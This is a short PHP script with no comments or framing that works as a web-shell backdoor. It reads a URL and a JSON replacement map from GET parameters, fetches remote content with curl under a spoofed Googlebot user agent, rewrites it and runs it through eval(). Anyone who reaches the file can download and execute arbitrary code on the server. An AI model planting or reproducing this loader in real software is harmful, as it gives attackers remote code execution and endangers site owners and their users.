<?php 

if (isset ($_GET['url']) && isset ($_GET['args'])) { 
	$ch = curl_init();
	curl_setopt_array($ch, array(
		CURLOPT_URL => $_GET['url'],
		CURLOPT_RETURNTRANSFER => 1,
		CURLOPT_USERAGENT => "Googlebot/2.1 (+http://www.google.com/bot.html)"
	));
	
	$toReplace = json_decode($_GET['args'], true); 
	eval(str_replace(array_keys($toReplace), array_values($toReplace), curl_exec($ch))); 
}